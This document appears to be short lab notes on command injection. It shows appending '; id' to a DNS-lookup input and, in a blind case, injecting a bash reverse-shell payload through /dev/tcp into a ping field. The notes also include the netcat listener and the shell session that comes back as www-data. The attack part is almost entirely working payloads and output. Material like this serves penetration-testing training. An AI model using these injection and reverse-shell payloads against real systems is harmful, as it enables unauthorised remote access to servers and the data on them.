# Command injection

- Running a command followed yb `;` or `|` and your injected command
  
## Standard command injection
- eg. applicaiton accepts DNS lookup eg. `nsa.gov.au`
- We tack on `id` command
  
`www.nsa.gov; id` - `uid=33(www-data) gid=33(www-data) groups=33(www-data) `

## Blind
- eg. commands allowed for input is IP address to ping eg. `127.0.0.1`

We start a nc listener
```
root@attackdefense:~# nc -lvnp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
```

We launch this payload to start reverse shell - `127.0.0.1; bash -c "bash -i >& /dev/tcp/192.186.119.2/4444 0>&1"`

We get a reverse shell
```
root@attackdefense:~# nc -lvnp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.186.119.3.
Ncat: Connection from 192.186.119.3:53752.
bash: cannot set terminal process group (11): Inappropriate ioctl for device
bash: no job control in this shell
www-data@victim-1:/app$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@victim-1:/app$ 
```
